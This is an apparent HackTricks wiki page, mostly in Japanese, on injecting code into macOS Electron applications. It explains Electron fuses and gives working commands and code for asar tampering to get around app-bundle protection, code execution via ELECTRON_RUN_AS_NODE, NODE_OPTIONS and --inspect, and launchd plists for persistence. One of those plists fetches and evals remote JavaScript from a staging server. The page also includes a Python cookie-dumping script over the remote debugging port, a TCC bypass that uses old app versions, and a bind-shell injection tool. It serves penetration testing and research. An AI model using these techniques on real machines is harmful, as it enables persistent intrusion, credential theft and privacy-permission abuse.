# macOS Electron Applications Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## 基本情報

Electronが何か知らない場合は、[**こちらにたくさんの情報があります**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps)。しかし、今はElectronが**node**を実行することだけを知っておいてください。\
そしてnodeには、指定されたファイル以外の**コードを実行させるために使用できる**いくつかの**パラメータ**と**環境変数**があります。

### Electron Fuses

これらの技術については次に説明しますが、最近Electronはそれらを防ぐためにいくつかの**セキュリティフラグ**を追加しました。これらは[**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses)であり、macOSのElectronアプリが**任意のコードを読み込むのを防ぐために使用されるものです**：

* **`RunAsNode`**: 無効にすると、コードを注入するための環境変数**`ELECTRON_RUN_AS_NODE`**の使用を防ぎます。
* **`EnableNodeCliInspectArguments`**: 無効にすると、`--inspect`、`--inspect-brk`のようなパラメータは尊重されません。この方法でコードを注入するのを避けます。
* **`EnableEmbeddedAsarIntegrityValidation`**: 有効にすると、読み込まれた**`asar`** **ファイル**はmacOSによって**検証されます**。これにより、このファイルの内容を変更することによる**コード注入を防ぎます**。
* **`OnlyLoadAppFromAsar`**: これが有効になっている場合、次の順序で読み込むのではなく：**`app.asar`**、**`app`**、最後に**`default_app.asar`**。app.asarのみをチェックして使用するため、**`embeddedAsarIntegrityValidation`**フューズと組み合わせることで**検証されていないコードを読み込むことが不可能になります**。
* **`LoadBrowserProcessSpecificV8Snapshot`**: 有効にすると、ブラウザプロセスは`browser_v8_context_snapshot.bin`というファイルをV8スナップショットに使用します。

コード注入を防がないもう一つの興味深いフューズは：

* **EnableCookieEncryption**: 有効にすると、ディスク上のクッキーストアはOSレベルの暗号化キーを使用して暗号化されます。

### Electron Fusesの確認

アプリケーションから**これらのフラグを確認することができます**：
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron Fuseの変更

[**ドキュメントに記載されているように**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode)、**Electron Fuse**の設定は、**Electronバイナリ**内に構成されており、どこかに文字列**`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**が含まれています。

macOSアプリケーションでは、通常、`application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`にあります。
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
このファイルを[https://hexed.it/](https://hexed.it/)に読み込み、前の文字列を検索できます。この文字列の後に、各ヒューズが無効か有効かを示す数字「0」または「1」がASCIIで表示されます。ヒューズの値を**変更する**ために、16進数コード（`0x30`は`0`、`0x31`は`1`）を変更してください。

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

これらのバイトを変更してアプリケーション内の**`Electron Framework`バイナリ**を**上書き**しようとすると、アプリは実行されません。

## RCE Electronアプリケーションへのコード追加

Electronアプリが使用している**外部JS/HTMLファイル**がある可能性があるため、攻撃者はこれらのファイルにコードを注入し、その署名がチェックされないため、アプリのコンテキストで任意のコードを実行できます。

{% hint style="danger" %}
ただし、現時点では2つの制限があります：

* アプリを変更するには**`kTCCServiceSystemPolicyAppBundles`**権限が**必要**であり、デフォルトではこれが不可能になっています。
* コンパイルされた**`asap`**ファイルは通常、ヒューズ**`embeddedAsarIntegrityValidation`**および**`onlyLoadAppFromAsar`**が**有効**です。

この攻撃経路をより複雑（または不可能）にしています。
{% endhint %}

**`kTCCServiceSystemPolicyAppBundles`**の要件を回避することは可能で、アプリケーションを別のディレクトリ（例えば**`/tmp`**）にコピーし、フォルダ**`app.app/Contents`**の名前を**`app.app/NotCon`**に変更し、**悪意のある**コードで**asar**ファイルを**変更**し、再び**`app.app/Contents`**に名前を戻して実行することができます。

asarファイルからコードを展開するには、次のコマンドを使用できます：
```bash
npx asar extract app.asar app-decomp
```
そして、次のように修正した後に再パッケージ化します：
```bash
npx asar pack app-decomp app-new.asar
```
## RCE with `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

[**ドキュメント**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node)によると、この環境変数が設定されている場合、プロセスは通常のNode.jsプロセスとして開始されます。

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
もしfuse **`RunAsNode`** が無効になっていると、env var **`ELECTRON_RUN_AS_NODE`** は無視され、この方法は機能しません。
{% endhint %}

### アプリのPlistからのインジェクション

[**ここで提案されているように**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)、このenv変数をplistで悪用して持続性を維持することができます：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE with `NODE_OPTIONS`

ペイロードを別のファイルに保存し、実行することができます：

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
もし fuse **`EnableNodeOptionsEnvironmentVariable`** が **無効** の場合、アプリは起動時に env var **NODE\_OPTIONS** を **無視** します。ただし、env 変数 **`ELECTRON_RUN_AS_NODE`** が設定されている場合は、fuse **`RunAsNode`** が無効であれば、これも **無視** されます。

**`ELECTRON_RUN_AS_NODE`** を設定しないと、次の **エラー** が表示されます: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### アプリ Plist からのインジェクション

この env 変数を plist で悪用して、これらのキーを追加することで永続性を維持できます:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE with inspecting

According to [**this**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), **`--inspect`**、**`--inspect-brk`**、および **`--remote-debugging-port`** のようなフラグを使用してElectronアプリケーションを実行すると、**デバッグポートが開かれ**、それに接続できるようになります（例えば、`chrome://inspect`のChromeから）し、**コードを注入する**ことや新しいプロセスを起動することも可能です。\
For example:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
もし**`EnableNodeCliInspectArguments`**が無効になっている場合、アプリは起動時にノードパラメータ（`--inspect`など）を**無視**します。ただし、環境変数**`ELECTRON_RUN_AS_NODE`**が設定されている場合は、これも**無視**されます。これは、フューズ**`RunAsNode`**が無効になっている場合です。

しかし、**electronパラメータ`--remote-debugging-port=9229`**を使用することで、Electronアプリから**履歴**（GETコマンドを使用）やブラウザの**クッキー**を盗むことが可能ですが、前のペイロードは他のプロセスを実行するためには機能しません。
{% endhint %}

パラメータ**`--remote-debugging-port=9222`**を使用することで、Electronアプリから**履歴**（GETコマンドを使用）やブラウザの**クッキー**を盗むことが可能です（クッキーはブラウザ内で**復号化**され、**jsonエンドポイント**がそれらを提供します）。

その方法については[**こちら**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)と[**こちら**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)で学ぶことができ、ツール[WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut)や次のようなシンプルなスクリプトを使用できます:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
In [**このブログ投稿**](https://hackerone.com/reports/1274695)では、このデバッグが悪用されて、ヘッドレスChromeが**任意のファイルを任意の場所にダウンロード**します。

### アプリのPlistからのインジェクション

この環境変数をplistで悪用して、持続性を維持するためにこれらのキーを追加できます：
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC バイパス 古いバージョンを悪用

{% hint style="success" %}
macOS の TCC デーモンは、実行されているアプリケーションのバージョンをチェックしません。したがって、**Electron アプリケーションにコードを注入できない**場合は、アプリの以前のバージョンをダウンロードし、それにコードを注入することができます。そうすれば、TCC 権限を取得します（Trust Cache がそれを防がない限り）。
{% endhint %}

## 非 JS コードの実行

前述の技術を使用すると、**Electron アプリケーションのプロセス内で JS コードを実行**できます。ただし、**子プロセスは親アプリケーションと同じサンドボックスプロファイルの下で実行され**、**TCC 権限を継承します**。\
したがって、カメラやマイクにアクセスするために権限を悪用したい場合は、単に**プロセスから別のバイナリを実行**することができます。

## 自動注入

ツール [**electroniz3r**](https://github.com/r3ggi/electroniz3r) は、**脆弱な Electron アプリケーション**を見つけてそれにコードを注入するために簡単に使用できます。このツールは、**`--inspect`** 技術を使用しようとします：

自分でコンパイルする必要があり、次のように使用できます：
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## 参考文献

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{% hint style="success" %}
AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
